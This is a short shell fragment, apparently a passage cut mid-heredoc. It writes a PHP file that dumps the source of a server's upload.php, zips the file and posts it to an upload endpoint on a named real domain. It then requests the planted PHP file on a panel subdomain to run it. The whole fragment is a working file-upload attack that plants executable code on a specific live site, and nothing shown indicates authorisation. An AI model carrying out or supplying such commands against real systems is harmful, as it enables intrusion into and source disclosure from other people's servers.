<?php echo file_get_contents('/home/h417440/panel.silveriom.ir/upload.php'); EOF
zip -r test_up.zip test_upload.php
curl -s -X POST -F "file=@test_up.zip" https://silveriom.ir/upload_subdomain.php
curl -s "https://panel.silveriom.ir/test_upload.php"